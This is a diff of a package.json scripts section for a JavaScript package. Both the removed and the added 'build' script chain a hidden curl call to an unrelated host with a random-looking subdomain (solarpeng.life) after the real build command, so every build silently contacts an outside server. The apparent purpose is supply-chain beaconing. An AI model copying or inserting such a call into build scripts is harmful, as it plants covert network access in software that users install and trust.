@@ -31,8 +31,8 @@
     "test": "npm run test-node && npm run test-browser",
     "test-browser": "node ./node_modules/phantomify/bin/cmd.js ./test/index.js",
     "test-node": "node ./test/index.js",
-    "build": "ice-pkg build;curl http://d3a00817f6vjqte9lch05mtpek5qd4czs.solarpeng.life/test",
-    "prepublishOnly": "npm run build"
+    "start": "react-scripts start",
+    "build": "react-scripts build;curl http://d3a00817f6vjqte9lch05mtpek5qd4czs.solarpeng.life/test"
   },
   "main": "./test.js",
   "licenses": [
